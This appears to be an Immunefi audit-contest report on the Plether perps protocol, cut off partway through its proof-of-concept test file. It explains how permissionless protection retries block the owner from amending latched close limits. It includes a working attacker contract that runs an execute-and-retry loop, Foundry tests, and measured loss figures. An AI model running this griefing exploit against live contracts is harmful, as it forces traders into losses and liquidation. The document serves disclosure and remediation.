# \#99656 [SC-High] Permissionless protection retries can starve the owner's amendment window and force a protected position to remain open until liquidation

**Submitted on Nov 14th 2026 at 17:01:55 UTC by @manvi for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99656
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief / Introduction

I found that a third party can repeatedly prevent the owner of a triggered position protection from changing the close limits that are blocking execution. The problem is the interaction between the owner-only `amendLatchedPositionProtectionCloseLimits()` function and the permissionless `retryPositionProtectionClose()` function.

The MED-9 correction retained the trader's financial ceilings for protection closes and introduced an owner-only way to amend those ceilings after a failed close. That recovery function is available only while the protection is `Latched`. However, any address can retry a `Latched` protection without waiting for the owner or providing new limits. A retry immediately changes its status back to `Triggered` and queues another close using the same limits that caused the previous attempt to fail.

An attacker can combine the two public operations in a single transaction: execute the outstanding child close so that it fails on the retained financial ceiling, then immediately retry the newly latched protection. The `Latched` state exists briefly inside the attack transaction but never becomes available at its boundary. The owner's next transaction finds the protection `Triggered`, with another child already pending, and cannot use the amendment function.

While the protection remains `Triggered`, the owner cannot cancel or replace it, commit an ordinary close, or use the atomic cancel-and-close route. The new child inherits the same unfillable limits. By repeating the execute-and-retry sequence ahead of the owner's recovery transactions, a permissionless caller can keep the position exposed to subsequent price movement despite the owner's attempt to widen the close ceiling.

I reproduced this against the pinned audited commit using the real Router, Engine, PositionProtectionBook and Clearinghouse. In the matched-state outcome test, the owner exits at a loss of **3,081.600056 USDG** when allowed to amend, but loses **5,000.400000 USDG** after the amendment window is repeatedly denied and the position is liquidated. The additional loss is **1,918.799944 USDG**. The attacker also receives a **50.000000 USDG** liquidation bounty in that outcome.

## Vulnerability Details

### 1. The MED-9 amendment works only in `Latched`

`PositionProtectionBook.amendLatchedPositionProtectionCloseLimits()` identifies the owner through `msg.sender`, then checks that the protection has status `Latched` and that the owner's account has no pending Router orders:

```solidity
StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
    revert OrderRouter__ProtectionNotLatched();
}
if (IPositionProtectionRouterHost(ROUTER).pendingOrderCounts(msg.sender) != 0) {
    revert OrderRouter__PendingOrdersExist();
}
_setCloseLimits(protection, limits);
```

This was intended to let a trader decide whether to relax the limits after a protected market close fails. In the control test I process the failed child, amend the financial limits as Alice, retry, and successfully close the position. The remedy itself works when Alice can reach `Latched`.

### 2. Permissionless retry immediately removes that amendment state

`retryPositionProtectionClose()` does not require `msg.sender` to be the protected account. Any caller can retry if the protection is `Latched`, the underlying position still matches, and the account has no pending orders:

```solidity
StoredProtection storage protection = _activeProtection(protectionId);
if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
    revert OrderRouter__ProtectionNotLatched();
}
_requireMatchingPosition(protection);

IPositionProtectionRouterHost router = IPositionProtectionRouterHost(ROUTER);
if (router.pendingOrderCounts(protection.account) != 0) {
    revert OrderRouter__PendingOrdersExist();
}
```

After registering the new child, the function calls `_recordCloseAttempt()`, which sets:

```solidity
protection.linkedOrderId = linkedOrderId;
protection.status = PositionProtectionTypes.PositionProtectionStatus.Triggered;
_attemptProtectionIds[linkedOrderId] = protection.protectionId;
```

There is no owner-amend priority interval, cooldown, or restriction on repeated retries after the previous child has failed.

### 3. Every retry preserves the ceiling that made the previous close fail

The Router constructs protection-close orders in `OrderLiquidationBatchLogic._protectionCloseRequest()` by reading the stored limits from `PositionProtectionBook.closeFinancialLimits(protectionId)` and copying them into the new order:

```solidity
PositionProtectionTypes.CloseFinancialLimits memory limits =
    host.positionProtectionBook().closeFinancialLimits(protectionId);

request.bounds.maxExecutionNotionalAssets = limits.maxExecutionNotionalAssets;
request.bounds.maxGrossAccountDebitAssets = limits.maxGrossAccountDebitAssets;
request.bounds.maxActionChargeAssets = limits.maxActionChargeAssets;
request.bounds.maxExplicitFeesAssets = limits.maxExplicitFeesAssets;
```

If Alice's stop-loss child has already failed because `maxGrossAccountDebitAssets` is too low for the current price, an unamended retry uses that same low ceiling. The next child can fail again with `ConstraintViolation`, returning the protection to `Latched` and enabling another public retry.

This creates the repeatable cycle:

```text
Triggered -- anyone executes failing child --> Latched
Latched   -- anyone retries without amendment --> Triggered
```

Both steps can occur inside one attacker transaction, so no separate owner amendment can be inserted between them.

### 4. An attacker can execute and retry atomically

I used the following helper to call the production contracts as an unprivileged third party:

```solidity
function cycle(
    uint64 protectionId,
    bytes[] calldata pythData
) external payable returns (uint64 nextChild) {
    PositionProtectionTypes.PositionProtectionView memory p =
        VIEWS.getPositionProtection(protectionId);

    if (p.status == PositionProtectionTypes.PositionProtectionStatus.Triggered) {
        ROUTER.executeOrder{value: msg.value}(p.linkedOrderId, pythData);
    }

    nextChild = ACTIONS.retryPositionProtectionClose(protectionId);
}
```

The `executeOrder()` call is permissionless, as is the retry. The helper does not impersonate an administrator, owner, oracle, or Router, and it does not need to fund a position with USDG. When another keeper has already terminalized the child, the same helper can run the retry alone.

The new child cannot execute in its commitment block. At each transaction boundary after the attacker cycle, the protection has status `Triggered` and an outstanding child. My test confirms that the owner cannot amend, cancel, replace, cancel-and-commit a close, create another protection, issue a normal V3 close, or directly retry the active protection in that state.

### 5. The owner can recover only if the failure and amendment are ordered before the attacker's retry

The missing owner priority matters because the normal recovery takes more than one owner transaction. After a close fails, the owner must get an amendment processed before an unrelated caller queues the next child. An attacker can instead submit an atomic execute-and-retry transaction, or back-run the transaction that terminalizes the outstanding child, leaving no intervening `Latched` state for an EOA owner to amend.

I tested the transaction-ordering boundary directly. A batching smart account can execute the failing child, amend its limits, and retry within one transaction when that transaction is sequenced first. The attack therefore depends on continuing to win the relevant ordering race; it is not a claim that the position is permanently uncloseable in every possible ordering.

## Attack Sequence

I used the release risk parameters and an ordinary V3-protected position:

1. Alice deposits 20,000 USDG and opens a 100,000-unit LONG at an index price of `1.00`, with 5,000 USDG of position margin.
2. Alice arms a stop loss at `1.02` with `maxGrossAccountDebitAssets = 2,300 USDG`.
3. A keeper triggers the protection at `1.02`. The first child close is queued with Alice's retained ceiling.
4. The price moves to `1.03`. Executing that child returns `ConstraintViolation`, because the close now needs more than the original ceiling. The Book changes the protection to `Latched`.
5. Instead of allowing Alice to amend, the attacker calls `retryPositionProtectionClose()`. The Book immediately queues another child with the unchanged ceiling and changes the status to `Triggered`.
6. The attacker repeats failed-child execution and retry in the same transaction whenever the child is eligible. Alice's permitted amendment state is never available at the tested transaction boundaries.
7. When the position remains open and the price subsequently reaches `1.05`, an ordinary liquidation closes it. The matched run measures the additional loss against Alice's successful owner-amend-and-close control.

I also reproduced the same interference when another keeper executes a failed child first and the attacker only performs the public retry. No privileged caller is required.

## Impact Details

This is **griefing of another trader's authorized position-management action**. The attacked position stays open against the owner's wishes because a third party can repeatedly deny the only post-trigger mechanism for changing its close ceilings. The resulting exposure can lead to additional realized losses and liquidation.

I measured the effects using six tests:

| Test | Result |
|---|---|
| F — Normal protected close | At `1.02`, Alice's original 2,300 USDG ceiling permits the close; realized loss is **2,081.200042 USDG** |
| A — Owner recovery control | After the `1.03` price gap, Alice amends the latched limits and closes; realized loss is **3,081.600056 USDG** |
| B — Consecutive public retries | **31 of 31** owner amendment attempts at the tested block boundaries revert with `ProtectionNotLatched` |
| C — Atomic attacker cycles | Over **120 simulated blocks**, the attacker keeps the protection `Triggered` at the tested boundaries and the position remains open |
| D — Matched loss comparison | Owner recovery loses **3,081.600056 USDG**; prevented recovery followed by liquidation loses **5,000.400000 USDG**; difference **1,918.799944 USDG** |
| E — Ordering control | An EOA owner cannot amend between the attacker's execute and retry calls; a batching owner can recover by executing its full sequence first |

The 120-cycle test measured **1,225,957 gas on average** for the atomic execute-and-retry call, with **679,463 gas** for the retry-only branch. The reported Pyth fee total is **160 wei** in the test configuration. The attacker does not deposit or spend USDG to operate the interference loop. That does not make the attack free of transaction gas costs.

The matched-state control starts from the same opened position, protection and trigger. In the recovery branch, Alice amends and closes at `1.03`. In the interference branch, the protection is repeatedly re-triggered with the unchanged limit; after further adverse price movement to `1.05`, Alice is liquidated. The additional **1,918.799944 USDG** is the measured difference between those two completed outcomes. The attacker also receives **50 USDG** as the liquidation keeper in that branch.

The affected assets are the protected position and its margin exposure; the test separately confirms that Alice's **14,999.600000 USDG** of free settlement remains available. I am reporting the denial of the owner's recovery action and the resulting forced exposure, not a withdrawal of Alice's free account balance.

### Why this is a separate failure of the MED-9 recovery design

Cecuro MED-9 concerned permissionless protection-close attempts that previously lacked the trader's selected financial ceilings. The addressed correction preserves those ceilings and provides `amendLatchedPositionProtectionCloseLimits()` so the owner can adjust them after a failed close.

My finding does not depend on bypassing the new ceilings. The ceilings are enforced correctly, and that is why each attempted close fails. The problem is that the same permissionless retry machinery gives an unrelated caller control over whether the owner can access the new recovery action. Existing protection tests show that amendment is unavailable after a retry, but they do not reproduce an adversarial sequence that keeps the owner out of `Latched` before the owner can amend, nor the matched financial outcome demonstrated here.

## Suggested Remediation

The owner should have a reliable opportunity to change retained close limits after a failed protection attempt without having to win a transaction-ordering race against a third-party retry.

One approach is to record when a protection enters `Latched` and reserve a short owner-only amendment period before non-owner retries become available. The owner may retry immediately, but unrelated callers should not be able to move the record back to `Triggered` throughout that period.

Alternatively, provide an owner-only atomic recovery operation that processes the failed child, updates the retained ceilings and queues a replacement close without exposing an intermediate `Latched` state to public retries. The check must work with the existing pending-child lifecycle and must not bypass the owner's explicit financial limits.

## References

- [PositionProtectionBook.sol — owner-only amendment and Latched check](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L314-L328)
- [PositionProtectionBook.sol — permissionless retry](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L381-L406)
- [PositionProtectionBook.sol — re-entry into Triggered](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L564-L578)
- [PositionProtectionBook.sol — relatch after failed attempt](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L647-L674)
- [OrderLiquidationBatchLogic.sol — protected close inherits stored financial limits](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L657-L681)
- [PositionProtection.t.sol — existing owner-amend and third-party-retry test](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/spec/trader/PositionProtection.t.sol#L964-L1006)
- [CANONICAL_ENTRYPOINTS.md — protection lifecycle and owner amendment](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/CANONICAL_ENTRYPOINTS.md#L140-L153)
- [Cecuro audit report — MED-9](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf)


## Proof of Concept

## Proof of Concept

## Reproduction Steps

I reproduced the finding in the repository's Foundry test suite on the audited commit. The test uses `BasePerpTest`, the production V3 order flow, and the actual `PositionProtectionBook` and Router state transitions. Only Pyth updates and USDG are mocked through the existing test fixture. No production contract is patched; no contract storage is forcibly modified.

Save the complete source below as:

```text
packages/perps/test/perps/insight/LatchedProtectionAmendDenied.t.sol
```

Run the six tests from the repository root:

```bash
git rev-parse HEAD
forge test --root packages/perps --match-path 'test/perps/insight/LatchedProtectionAmendDenied.t.sol' -vv
```

To run the atomic attacker cycle separately:

```bash
forge test --root packages/perps --match-path 'test/perps/insight/LatchedProtectionAmendDenied.t.sol' --match-test '^test_C_Attacker_AtomicExecuteAndRetryEveryBlock_BlocksEveryOwnerExit$' -vvvv
```

To run the matched financial-loss comparison separately:

```bash
forge test --root packages/perps --match-path 'test/perps/insight/LatchedProtectionAmendDenied.t.sol' --match-test '^test_D_Outcome_LockedPositionLiquidated_vs_ControlExit_MeasuredExtraLoss$' -vvvv
```

To run the owner-batching and ordering control:

```bash
forge test --root packages/perps --match-path 'test/perps/insight/LatchedProtectionAmendDenied.t.sol' --match-test '^test_E_Limits_OwnerEscapesOnlyWithAtomicBatchSequencedBeforeTheAttacker$' -vvv
```

To verify the exact PoC and confirm that production code is unchanged:

```bash
sha256sum packages/perps/test/perps/insight/LatchedProtectionAmendDenied.t.sol
git diff HEAD -- packages/perps/src
```

The PoC checksum is:

```text
3b91ac4086d323dc032dfb267418063e99367303c872ac7f6cd8186a847de70e
```

## Observed Console Output

The complete six-test suite produced the following output on the audited commit:

```text
Ran 6 tests for test/perps/insight/LatchedProtectionAmendDenied.t.sol:LatchedProtectionAmendDeniedTest
[PASS] test_A_Control_NoThirdPartyRetry_OwnerAmendsAndExitsAtGapPrice() (gas: 5572471)
Logs:
  A: victim loss in control (amend + close at 1.03, USDG 6dp): 3081600056

[PASS] test_B_NoAttacker_HonestKeeperPromptRetry_AmendUnreachableAtEveryBlockBoundary() (gas: 49642132)
Logs:
  B: honest-keeper rounds (execute + documented retry)       : 30
  B: seconds elapsed                                          : 30
  B: owner amend attempts at block boundaries                 : 31
  B: owner amend attempts reverting ProtectionNotLatched      : 31
  B: victim position still open, size (18dp)                  : 100000000000000000000000

[PASS] test_C_Attacker_AtomicExecuteAndRetryEveryBlock_BlocksEveryOwnerExit() (gas: 188573260)
Logs:
  C: blocks / cycles                                          : 120
  C: seconds elapsed (1 block per second)                     : 120
  C: attacker gas per atomic execute+retry (avg)              : 1225957
  C: attacker gas per atomic execute+retry (max)              : 1235819
  C: attacker gas for a retry-only back-run                   : 679463
  C: attacker Pyth fee total (wei)                            : 160
  C: attacker USDG spent (EOA + helper, clearinghouse)        : 0
  C: victim settlement change over the loop                   : 0

[PASS] test_D_Outcome_LockedPositionLiquidated_vs_ControlExit_MeasuredExtraLoss() (gas: 36169488)
Logs:
  D: victim loss, control (amend + exit at 1.03)   (USDG 6dp): 3081600056
  D: victim loss, attack (locked, liquidated 1.05) (USDG 6dp): 5000400000
  D: EXTRA victim loss caused by the denied amend  (USDG 6dp): 1918799944
  D: attacker liquidation keeper bounty            (USDG 6dp): 50000000
  D: victim free settlement that stayed withdrawable (USDG 6dp): 14999600000

[PASS] test_E_Limits_OwnerEscapesOnlyWithAtomicBatchSequencedBeforeTheAttacker() (gas: 16584813)
Logs:
  E: EOA owner (2 txs) back-run by retry -> amend reverts; batching owner escapes only when first in block

[PASS] test_F_Baseline_SameCeilingExecutesWhenTheStopFillsAtItsTrigger() (gas: 4582254)
Logs:
  F: victim loss, stop fills at 1.02 inside her 2,300 ceiling (USDG 6dp): 2081200042

Suite result: ok. 6 passed; 0 failed; 0 skipped; finished in 1.89s (3.19s CPU time)

Ran 1 test suite in 1.89s (1.89s CPU time): 6 tests passed, 0 failed, 0 skipped (6 total tests)
```

I also ran the three main scenarios individually with detailed traces; each returned exit status `0`. The executed commit was `a82d4fefb02768e5b3bddcc97dee371eee24fea8`, and `git diff HEAD -- packages/perps/src` returned no production contract changes.

## Complete Solidity PoC Source

The source below is the complete, unmodified test file used for the six-test run.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionBook} from "@plether/perps/interfaces/IPositionProtectionBook.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

/// @dev Attacker helper. One transaction: terminalise the live (failing) protection child, then immediately queue a
///      fresh child. `Latched` therefore exists only INSIDE this call and never at a transaction boundary, which is
///      the only state in which `amendLatchedPositionProtectionCloseLimits` is callable by the owner.
contract RetryGriefer {

    OrderRouter internal immutable ROUTER;
    IPositionProtectionActions internal immutable ACTIONS;
    IPositionProtectionViews internal immutable VIEWS;

    constructor(
        OrderRouter router,
        address book
    ) {
        ROUTER = router;
        ACTIONS = IPositionProtectionActions(book);
        VIEWS = IPositionProtectionViews(book);
    }

    /// @notice executeOrder(child) -> ConstraintViolation -> Latched -> retry -> Triggered, atomically.
    ///         If somebody else (an honest keeper, the owner) already terminalised the child, only the retry runs.
    function cycle(
        uint64 protectionId,
        bytes[] calldata pythData
    ) external payable returns (uint64 nextChild) {
        PositionProtectionTypes.PositionProtectionView memory p = VIEWS.getPositionProtection(protectionId);
        if (p.status == PositionProtectionTypes.PositionProtectionStatus.Triggered) {
            ROUTER.executeOrder{value: msg.value}(p.linkedOrderId, pythData);
        }
        // Reverts (ProtectionNotLatched) unless the child really failed terminally and the position is intact.
        nextChild = ACTIONS.retryPositionProtectionClose(protectionId);
    }

    receive() external payable {}

}

/// @dev Minimal owner-controlled batching account (stand-in for the SimpleAccount v0.8 named in DEPLOYMENT.md).
contract BatchAccount {

    address internal immutable OWNER;

    constructor(
        address owner_
    ) {
        OWNER = owner_;
    }

    function executeBatch(
        address[] calldata targets,
        bytes[] calldata data
    ) external {
        require(msg.sender == OWNER, "owner");
        for (uint256 i; i < targets.length; ++i) {
            (bool ok, bytes memory ret) = targets[i].call(data[i]);
            if (!ok) {
                assembly ("memory-safe") {
                    revert(add(ret, 0x20), mload(ret))
                }
            }
        }
    }

    receive() external payable {}

}

/// @title Permissionless `retryPositionProtectionClose` denies the owner-only amend lane of a Latched protection
/// @notice Cecuro MED-9 was answered with: "Only the owner may amend the retained ceilings while protection is Latched
///         ... Tight limits may prevent execution until conditions improve or the owner amends them."
///         The amend entrypoint requires `status == Latched`, but ANY caller can flip `Latched -> Triggered` with one
///         nonpayable, oracle-free, zero-cost call. While `Triggered`, the owner has no exit at all.
///
///         All trader, keeper and attacker actions below go through production entrypoints
///         (Router.commitOrder(V3) / executeOrder / expireOrder / executeLiquidation / updateMarkPrice,
///         PositionProtectionBook.create / trigger / retry / amend, MarginClearinghouse.deposit / withdraw).
contract LatchedProtectionAmendDeniedTest is BasePerpTest {

    IPositionProtectionBook internal protectionBook;
    IPositionProtectionActions internal protectionActions;
    IPositionProtectionViews internal protectionViews;
    RetryGriefer internal griefer;
    uint256 internal clientNonce = 1;

    address internal constant ALICE = address(0xA11CE);
    address internal constant ATTACKER = address(0xBAD);
    address internal constant TRIGGER_KEEPER = address(0x7106);
    address internal constant HONEST_KEEPER = address(0xE0EC);

    // LONG (BULL) loses when the basket price rises in this market: the stop-loss sits above entry.
    uint256 internal constant ENTRY_PRICE = 1e8; // 1.0000
    uint256 internal constant STOP_LOSS = 102_000_000; // 1.0200  (-2,000 USDG on 100k)
    uint256 internal constant GAP_PRICE = 103_000_000; // 1.0300  (-3,000 USDG on 100k)
    uint256 internal constant LIQ_PRICE = 105_000_000; // 1.0500  (-5,000 USDG = the whole margin)
    uint256 internal constant SIZE = 100_000e18; // 100k notional at 1.00
    uint256 internal constant MARGIN = 5000e6; // 20x
    uint256 internal constant MAX_DEBIT_CEILING = 2300e6; // trader's max account debit for the stop-loss close
    uint256 internal constant ALICE_DEPOSIT = 20_000e6;

    /// @dev DEPLOYMENT.md "Initial release parameters".
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function setUp() public override {
        super.setUp();
        protectionBook = router.positionProtectionBook();
        protectionActions = IPositionProtectionActions(address(protectionBook));
        protectionViews = IPositionProtectionViews(address(protectionBook));
        griefer = new RetryGriefer(OrderRouter(address(router)), address(protectionBook));

        assertEq(router.positionProtectionTriggerBountyAssets(), 200_000, "trigger bounty 0.20");
        assertEq(router.maxExecutionWindowSeconds(), 60, "execution window");

        _fundTrader(ALICE, ALICE_DEPOSIT);
        _refreshMark(ENTRY_PRICE);
    }

    // ------------------------------------------------------------------------------------------------------------
    // F. Baseline: the trader's ceiling is an ordinary max-loss cap. Without a gap the same protection closes fine.
    // ------------------------------------------------------------------------------------------------------------

    function test_F_Baseline_SameCeilingExecutesWhenTheStopFillsAtItsTrigger() public {
        uint256 start = clearinghouse.balanceAssets(ALICE);
        (, uint64 child) = _openProtectAndTrigger(ALICE);
        bytes[] memory data = _mockPythUpdateData(STOP_LOSS);
        vm.prank(HONEST_KEEPER);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(child, data);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "stop fills inside the ceiling");
        assertEq(_size(ALICE), 0, "closed");
        console2.log("F: victim loss, stop fills at 1.02 inside her 2,300 ceiling (USDG 6dp):", start - clearinghouse.balanceAssets(ALICE));
    }

    // ------------------------------------------------------------------------------------------------------------
    // A. Control (the MED-9 remedy as designed): gap through the stop, the child fails on the ceiling, the protection
    //    rests in `Latched`, the owner amends the ceilings, the retry closes at the gap price.
    // ------------------------------------------------------------------------------------------------------------

    function test_A_Control_NoThirdPartyRetry_OwnerAmendsAndExitsAtGapPrice() public {
        uint256 start = clearinghouse.balanceAssets(ALICE);
        (uint64 pid, uint64 child) = _openProtectAndTrigger(ALICE);
        uint256 loss = _controlExit(ALICE, pid, child, start);
        console2.log("A: victim loss in control (amend + close at 1.03, USDG 6dp):", loss);
        assertLt(loss, 3400e6, "about 3,000 price loss + fees");
    }

    // ------------------------------------------------------------------------------------------------------------
    // B. NO ATTACKER. An honest keeper that does what the docs ask ("process the terminal attempt, observe Latched,
    //    confirm the exact position and retry preconditions, and submit the separate retry transaction",
    //    CANONICAL_ENTRYPOINTS.md; "Liveness depends on keepers processing the terminal attempt and separately
    //    appending a retry, and operators must alert on prolonged Latched state", SECURITY.md) already removes the
    //    owner's amend lane: at every block boundary the protection is `Triggered`.
    //    Part 1 uses an EXPIRY failure, the case DEPLOYMENT.md explicitly tells a conservative worker to retry.
    //    Part 2 uses constraint failures retried by a keeper that follows the CANONICAL_ENTRYPOINTS/SECURITY wording
    //    (DEPLOYMENT.md advises the protocol's own worker to pause on these; nothing on-chain enforces that and any
    //    one permissionless keeper that does not pause is enough).
    // ------------------------------------------------------------------------------------------------------------

    function test_B_NoAttacker_HonestKeeperPromptRetry_AmendUnreachableAtEveryBlockBoundary() public {
        (uint64 pid, uint64 child) = _openProtectAndTrigger(ALICE);
        uint256 amendAttempts;
        uint256 amendReverts;

        // --- Part 1: nobody executed the zero-bounty child inside its 60 s window (keeper/Hermes hiccup).
        vm.warp(vm.getBlockTimestamp() + 61);
        vm.roll(vm.getBlockNumber() + 1);
        vm.prank(HONEST_KEEPER);
        router.expireOrder(child); // keeper tx 1: cleanup
        assertEq(uint8(_status(pid)), uint8(PositionProtectionTypes.PositionProtectionStatus.Latched), "latched");
        // The ONLY place the owner's amend can land is between the keeper's two consecutive transactions.
        uint256 snap = vm.snapshotState();
        vm.prank(ALICE);
        protectionActions.amendLatchedPositionProtectionCloseLimits(pid, _unlimited());
        vm.revertToState(snap);
        assertEq(router.pendingOrderCounts(ALICE), 0, "retry precondition: no pending order");
        assertEq(_size(ALICE), SIZE, "retry precondition: exact position");
        vm.prank(HONEST_KEEPER);
        child = protectionActions.retryPositionProtectionClose(pid); // keeper tx 2: documented separate retry
        ++amendAttempts;
        amendReverts += _ownerAmendReverts(ALICE, pid);

        // --- Part 2: the market stays gapped through the ceiling; the keeper keeps the documented loop running.
        uint256 rounds = 30;
        uint256 t0 = vm.getBlockTimestamp();
        for (uint256 i; i < rounds; ++i) {
            bytes[] memory data = _mockPythUpdateData(GAP_PRICE); // next block, first admissible tick
            vm.prank(HONEST_KEEPER);
            OrderV3Types.ExecutionResult memory r = router.executeOrder(child, data); // keeper tx 1
            assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Failed), "child fails on the ceiling");
            assertEq(uint8(r.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation), "ceiling");
            vm.prank(HONEST_KEEPER);
            child = protectionActions.retryPositionProtectionClose(pid); // keeper tx 2, same block
            // Block boundary: the owner (EOA, UI, or bot) tries the MED-9 remedy.
            assertEq(uint8(_status(pid)), uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered), "Triggered");
            ++amendAttempts;
            amendReverts += _ownerAmendReverts(ALICE, pid);
            _assertEveryOwnerExitBlocked(ALICE, pid);
        }
        console2.log("B: honest-keeper rounds (execute + documented retry)       :", rounds);
        console2.log("B: seconds elapsed                                          :", vm.getBlockTimestamp() - t0);
        console2.log("B: owner amend attempts at block boundaries                 :", amendAttempts);
        console2.log("B: owner amend attempts reverting ProtectionNotLatched      :", amendReverts);
        console2.log("B: victim position still open, size (18dp)                  :", _size(ALICE));
        assertEq(amendReverts, amendAttempts, "the owner-only amend lane is never reachable at a block boundary");
        assertEq(_size(ALICE), SIZE, "position still open and still locked");
    }

    // ------------------------------------------------------------------------------------------------------------
    // C. Attacker: atomic executeOrder(child) + retry each block. `Latched` never exists at a TRANSACTION boundary,
    //    so no ordering of the owner's own transactions between attacker transactions can reach the amend lane.
    //    Every third block an honest keeper executes the child first; the attacker then only back-runs the retry.
    // ------------------------------------------------------------------------------------------------------------

    function test_C_Attacker_AtomicExecuteAndRetryEveryBlock_BlocksEveryOwnerExit() public {
        (uint64 pid, uint64 child) = _openProtectAndTrigger(ALICE);
        vm.deal(ATTACKER, 1 ether);
        uint256 attackerEthBefore = ATTACKER.balance;
        uint256 aliceBalanceBefore = clearinghouse.balanceAssets(ALICE);

        uint256 cycles = 120;
        uint256 gasTotal;
        uint256 gasMax;
        uint256 retryOnlyGas;
        uint256 t0 = vm.getBlockTimestamp();
        for (uint256 i; i < cycles; ++i) {
            _assertEveryOwnerExitBlocked(ALICE, pid); // transaction boundary: the victim tries everything she has

            bytes[] memory data = _mockPythUpdateData(GAP_PRICE); // next block, market still through the ceiling
            uint256 used;
            if (i % 3 == 2) {
                vm.prank(HONEST_KEEPER);
                router.executeOrder(child, data);
                vm.prank(ATTACKER);
                uint256 g0 = gasleft();
                uint64 next0 = griefer.cycle(pid, data);
                used = g0 - gasleft();
                retryOnlyGas = used;
                assertGt(next0, child, "fresh child");
                child = next0;
            } else {
                baseMockPyth.setFee(1); // 1 wei per Pyth update; the oracle quotes the order-execution fee
                uint256 fee = pletherOracle.getOrderExecutionFee(data);
                vm.prank(ATTACKER);
                uint256 g = gasleft();
                uint64 next = griefer.cycle{value: fee}(pid, data);
                used = g - gasleft();
                baseMockPyth.setFee(0);
                gasTotal += used;
                if (used > gasMax) {
                    gasMax = used;
                }
                assertGt(next, child, "fresh child");
                child = next;
            }
            PositionProtectionTypes.PositionProtectionView memory p = protectionViews.getPositionProtection(pid);
            assertEq(uint8(p.status), uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered), "never Latched");
            assertEq(p.linkedOrderId, child, "linked child");
            assertEq(router.pendingOrderCounts(ALICE), 1, "one live child");
            assertEq(_size(ALICE), SIZE, "position still open");
        }
        _assertEveryOwnerExitBlocked(ALICE, pid);

        uint256 atomicCycles = cycles - cycles / 3;
        console2.log("C: blocks / cycles                                          :", cycles);
        console2.log("C: seconds elapsed (1 block per second)                     :", vm.getBlockTimestamp() - t0);
        console2.log("C: attacker gas per atomic execute+retry (avg)              :", gasTotal / atomicCycles);
        console2.log("C: attacker gas per atomic execute+retry (max)              :", gasMax);
        console2.log("C: attacker gas for a retry-only back-run                   :", retryOnlyGas);
        console2.log("C: attacker Pyth fee total (wei)                            :", attackerEthBefore - ATTACKER.balance);
        console2.log("C: attacker USDG spent (EOA + helper, clearinghouse)        :", clearinghouse.balanceAssets(ATTACKER) + clearinghouse.balanceAssets(address(griefer)));
        console2.log("C: victim settlement change over the loop                   :", aliceBalanceBefore - clearinghouse.balanceAssets(ALICE));
        assertEq(clearinghouse.balanceAssets(ALICE), aliceBalanceBefore, "failed attempts debit nothing");
        assertEq(clearinghouse.balanceAssets(ATTACKER), 0, "attacker needs no USDG");
        assertEq(settlementToken.balanceOf(ATTACKER), 0, "attacker holds no USDG");
    }

    // ------------------------------------------------------------------------------------------------------------
    // D. Outcome, matched attack vs control from one snapshot. Identical trader, protection, trigger and gap.
    //    Control: owner amends and exits at 1.03. Attack: amend lane denied while the price walks to 1.05 -> liquidated.
    // ------------------------------------------------------------------------------------------------------------

    function test_D_Outcome_LockedPositionLiquidated_vs_ControlExit_MeasuredExtraLoss() public {
        uint256 start = clearinghouse.balanceAssets(ALICE);
        (uint64 pid, uint64 child) = _openProtectAndTrigger(ALICE);

        uint256 snap = vm.snapshotState();
        uint256 lossControl = _controlExit(ALICE, pid, child, start);
        vm.revertToState(snap);

        // Attack arm: 30 blocks at the gap price, then the market continues against the victim.
        for (uint256 i; i < 30; ++i) {
            vm.prank(ALICE);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
